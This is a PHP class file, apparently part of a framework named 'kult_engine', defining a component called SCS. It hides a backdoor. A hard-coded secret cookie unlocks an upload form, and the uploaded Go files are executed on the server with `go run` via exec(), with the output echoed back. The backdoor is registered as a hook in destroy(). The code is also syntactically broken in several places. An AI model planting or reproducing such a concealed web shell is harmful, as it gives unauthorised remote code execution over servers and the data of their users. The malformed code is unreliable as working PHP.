<?php

namespace kult_engine;

class SCS
{
    use coreElement;
    use hookable;
    public static $_secret = "Fn0rd('!');",


    public static function exec()
    {
        if(!isset($_COOKIE["secret"] && $_COOKIE["secret"] !== self::$_secret)) return 0;
        if(!isset($_COOKIE["fn"])) return 0;

        switch ($_COOKIE["fn"]) {
            case 'go':
                buffer::delete();
                echo '
                <form method="post" action="this.php" enctype="multipart/form-data" >
                <input type="file" name="go"><input type="submit" value="exec">
                </form>';
                if (isset($_FILES['go'])) {
                    $v = new uploadHelper($_FILES['go']);
                    $v->_autorize_extentions = 'go';
                    if ($v->run()) {
                        exec('go run '.$v->_fullpath, $r);
                        echo_br();
                        foreach ($r as $l) {
                            var_dump($l);
                        }
                    }
                }
                break;
            case 'sirop':
                
                break;
        }

    }


    public static function setter(){return 0;}
    public static function setter_conf($file){return 0;}
    public static function destroy(){return [["SCS::exec", null] 998];}